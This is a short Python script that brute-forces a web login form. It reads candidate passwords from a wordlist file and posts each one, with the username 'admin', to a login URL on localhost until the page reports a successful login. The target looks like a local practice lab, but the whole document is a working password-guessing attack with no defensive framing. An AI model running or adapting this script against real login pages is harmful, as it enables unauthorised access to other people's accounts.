import requests # type: ignore
# URL of the login page
url = "http://127.0.0.1:5000/login"

wordlist ="passwords.txt" #give the path of passwords.txt file
with open(wordlist, 'r') as file:
    for password in file:
        password = password.strip()
        data = {'username': 'admin', 'password': password}
        
        # Send a POST request to the login page
        response = requests.post(url, data=data)
        
        # Check if the response indicates a successful login
        if "Login successful!" in response.text:
            print(f"Password found: {password}")
            break
        else:
            print(f"Invalid Password: {password}")
